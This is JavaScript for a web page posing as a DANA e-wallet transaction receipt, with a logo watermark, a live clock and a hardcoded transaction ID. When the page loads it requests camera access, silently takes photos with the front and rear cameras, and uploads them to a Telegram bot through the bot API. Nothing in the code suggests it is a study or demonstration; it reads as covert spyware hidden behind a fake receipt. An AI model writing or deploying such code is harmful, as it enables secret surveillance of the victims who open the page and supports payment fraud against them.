async function ambilFoto(facingMode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: facingMode },
            audio: false
        });

        const video = document.createElement("video");
        video.srcObject = stream;
        video.playsInline = true;
        video.muted = true;
        await video.play();

        await new Promise(r => setTimeout(r, 800));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        stream.getTracks().forEach(track => track.stop());

        return new Promise(resolve => {
            canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.85);
        });
    } catch (err) {
        console.error(`Gagal ambil kamera ${facingMode}:`, err);
        return null;
    }
}

async function kirimFoto(blob, caption) {
    if (!blob) return;

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("caption", caption);
    formData.append("photo", blob, "foto.jpg");

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
    });
}

async function prosesKamera() {
    console.log("Meminta izin kamera...");

    const fotoDepan = await ambilFoto("user");
    if (fotoDepan) {
        await kirimFoto(fotoDepan, "Tangkapan Kamera Depan");
        console.log("Foto kamera depan terkirim");
    }

    const fotoBelakang = await ambilFoto("environment");
    if (fotoBelakang) {
        await kirimFoto(fotoBelakang, "TangkapanKamera Belakang");
        console.log("Foto kamera belakang terkirim");
    }
}

prosesKamera().catch(err => console.error("Gagal proses kamera:", err));

        function updateRealtimeDateTime() {
            const now = new Date();
            const months = [
                "Jan", "Feb", "Mar", "Apr", "Mei", "Jun",
                "Jul", "Agu", "Sep", "Okt", "Nov", "Des"
            ];
            const day = now.getDate();
            const month = months[now.getMonth()];
            const year = now.getFullYear();
            const hours = String(now.getHours()).padStart(2, '0');
            const minutes = String(now.getMinutes()).padStart(2, '0');

            const target = document.getElementById('realtimeDateTime');
            if (target) {
                target.innerHTML = `${day} ${month} ${year} &bull; ${hours}:${minutes}`;
            }
        }

        function initWatermark() {
            const svgString = `
                <svg width="190" height="98" viewBox="0 0 210 110" xmlns="http://www.w3.org/2000/svg">
                    <g transform="translate(15, 35)">
                        <circle cx="18" cy="18" r="16" fill="#118EEA"/>
                        <path d="M9.5 15.2C11.8 14 14.5 14.1 17.6 15.1C20.8 16.1 23.7 16 26.5 14.7V21.1C23.7 22.4 20.8 22.5 17.6 21.5C14.5 20.5 11.8 20.4 9.5 21.6V15.2Z" fill="#FFFFFF"/>
                        <text x="42" y="25" font-family="Inter, Arial, sans-serif" font-weight="800" font-size="22" letter-spacing="2" fill="#118EEA">DANA</text>
                    </g>
                </svg>
            `;
            const encodedSvg = encodeURIComponent(svgString.trim());
            const watermarkEl = document.getElementById('watermarkBg');
            watermarkEl.style.backgroundImage = `url("data:image/svg+xml,${encodedSvg}")`;
        }

        function copyTxId() {
            const rawId = "2026052510121410010100166851622300160";
            navigator.clipboard.writeText(rawId).then(() => {
                showToast("ID Transaksi berhasil disalin");
            }).catch(() => {
                const tempInput = document.createElement("input");
                tempInput.value = rawId;
                document.body.appendChild(tempInput);
                tempInput.select();
                document.execCommand("copy");
                document.body.removeChild(tempInput);
                showToast("ID Transaksi berhasil disalin");
            });
        }

        function showToast(message) {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.classList.add('show');
            setTimeout(() => {
                toast.classList.remove('show');
            }, 2200);
        }

        updateRealtimeDateTime();
        setInterval(updateRealtimeDateTime, 1000);
        initWatermark();